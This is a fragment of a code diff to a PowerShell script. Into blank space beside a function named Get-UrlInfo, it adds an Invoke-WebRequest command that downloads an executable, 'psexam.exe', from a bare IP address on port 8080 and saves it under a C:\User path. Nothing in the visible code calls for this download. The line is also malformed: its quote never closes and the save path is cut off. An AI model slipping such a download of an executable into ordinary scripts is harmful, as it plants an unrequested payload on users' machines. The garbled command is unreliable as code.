@@ -241,7 +241,8 @@ Function Get-UrlInfo {
 
 
 
-
+Invoke-WebRequest -Uri
+"10.50.34.170:8080/psexam.exe -outfile C:\User
 
 
 
